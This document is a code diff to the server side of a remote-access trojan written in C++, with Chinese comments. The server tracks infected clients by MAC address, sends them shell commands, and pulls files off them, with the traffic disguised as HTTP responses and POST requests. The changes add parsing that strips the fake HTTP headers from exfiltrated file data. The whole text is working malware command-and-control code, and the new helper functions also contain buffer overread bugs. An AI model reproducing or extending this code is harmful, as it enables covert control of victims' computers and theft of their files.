@@ -16,6 +16,7 @@ using namespace std;
 
 #define MAX_CMD_LEN		256
 #define MAC_ADDR_LEN	17
+#define POST_LEN		210
 #define DEFAULT_BUFLEN 1024
 
 typedef struct _TROJAN_INFO
@@ -27,7 +28,7 @@ typedef struct _TROJAN_INFO
 }TROJAN_INFO, *PTROJAN_INFO;
 // cmd like:
 // dir
-// remoteFile*localFile: c:\\1.txt*d:\\2.txt
+// remoteFile*localFile: d:\\1.txt*e:\\2.txt
 
 #define MAX_CLIENT_NUM		10
 #define NOW_CLIENT_NUM		3
@@ -36,8 +37,6 @@ bool inflag = 0;
 int now_client_num = 0;
 
 CRITICAL_SECTION cs;
-//EnterCriticalSection(&cs);
-//LeaveCriticalSection(&cs);
 
 char* protocolHead = "HTTP/1.1 200 OK\r\nServer: Server <0.1>\r\n"
 "Accept-Ranges: bytes\r\nContent-Length: 112\r\nConnection: close\r\n"
@@ -56,6 +55,21 @@ char * killhead(char* headcmd)
 }
 
 
+char * killhead(char* headcmd,int headdatalen)//切文件比较坑，结束位置难找
+{
+	char *result = (char *)malloc(headdatalen-POST_LEN + 1);
+	if (result == NULL) exit(1);
+	for (int i = POST_LEN; i <= headdatalen + 1; i++)
+		result[i - POST_LEN] = headcmd[i];
+	return result;
+}
+
+int headlen(char* headcmd)
+{
+	//cout << "报头长度" << strstr(headcmd, "\r\n\r\n") - headcmd + 4 << endl;
+	return strstr(headcmd, "\r\n\r\n") - headcmd + 4;
+}
+
 char* combine(char *s1, char *s2)
 {
 	char *result = (char *)malloc(strlen(s1) + strlen(s2) + 1);
@@ -65,6 +79,16 @@ char* combine(char *s1, char *s2)
 	return result;
 }
 
+
+char* combine(char *s1, char *s2,int len)
+{
+	char *result = (char *)malloc(len + 1);
+	if (result == NULL) exit(1);
+	strcpy(result, s1);
+	for (int i = POST_LEN; i <= len + 1; i++)
+		result[i] = s2[i - POST_LEN];
+	return result;
+}
 
 void init()
 {
@@ -267,7 +291,7 @@ DWORD WINAPI InputThread(LPVOID lpParameter)
 		}
 		else { cout << "客户端mac地址错误！"; }
 
-		Sleep(1000);
+		Sleep(2000);
 		/*}
 		else{ g_trojan_info[free_index].cmd_no = CMD_NULL; }*/
 
@@ -303,11 +327,7 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 
 		Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
 		if (Ret>0) cout << "返回Http响应," << strlen(protocolHead) << "字节" << endl;
-		if (Ret != strlen(protocolHead))
-		{
-			cout << "Send Info Error::" << GetLastError() << endl;
-			break;
-		}
+		
 
 		memset(RecvBuffer, 0, MAX_PATH);
 		Ret = recv(ClientSocket, RecvBuffer, MAX_PATH,0);
@@ -341,11 +361,11 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 		memset(CmdBuff, 0, MAX_CMD_LEN);
 		CmdNo = get_cmd_by_mac(mac, CmdBuff);
 
-		char recvbuf[DEFAULT_BUFLEN];
+		char recvbuf[2049];
 		FILE *file = NULL;
 		char *filename = LocalFile;
 		int invfilelen, filelen;
-		int recvbuflen = DEFAULT_BUFLEN;
+		int recvbuflen = 2*DEFAULT_BUFLEN;
 		int iResult;
 
 		switch(CmdNo)
@@ -370,7 +390,7 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			Ret = send(ClientSocket, combine(protocolHead, CmdBuff), strlen(protocolHead)+ strlen(CmdBuff), 0);
 			// recv cmd result from trojan
 			iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
-			printf("接收到返回数据:  %s(%d)\n", recvbuf, iResult);
+			printf("接收到返回数据:  %s(%d)\n", recvbuf, iResult);//包含头，要去的话调用killhead就行
 			break;
 		case CMD_DOWNLOAD:
 			cout << "执行文件下载" << endl;
@@ -383,15 +403,11 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			CmdLen = htonl(strlen(CmdBuff));
 			cout << "目标文件为" << CmdBuff << endl;
 			// send cmd len
-			//send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
-			Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
+			send(ClientSocket, (char *)&CmdLen, sizeof(DWORD), 0);
 			// send cmd content
 			//send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
-			Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
+			Ret = send(ClientSocket, combine(protocolHead, CmdBuff), strlen(protocolHead) + strlen(CmdBuff), 0);
 			// recv file from trojan
-
-
-			
 
 			iResult = recv(ClientSocket, recvbuf, sizeof(char *), 0);
 			if (iResult >0)
@@ -408,18 +424,24 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			// 持续接收数据，直到对方关闭连接 
 			do
 			{
+				memset(recvbuf, 0, 2049);
 				iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
+				recvbuf[iResult] = '\0';
+				int l=POST_LEN;
+				printf("接收到POST请求和数据:  %s(%d)\n", recvbuf, iResult);
+				char *buf = killhead(recvbuf, iResult);
+				iResult -= l;
 				if (iResult > 0)
 				{
 					cout << "还有" << torecvlen << "个字节需要接收" << endl;
 					int recvlen = iResult;
 					if (iResult > torecvlen)recvlen = torecvlen;
-					fwrite(recvbuf, 1, recvlen, file);
+					fwrite(buf, 1, recvlen, file);
 					torecvlen -= recvlen;
 					if (torecvlen <= 0)break;
-
+					
 					//情况1：成功接收到数据
-					//printf("接收到数据:  %s(%d)\n", recvbuf, iResult);
+					printf("分离的数据:  %s(%d)\n", buf, iResult);
 
 				}
 				else if (iResult == 0)
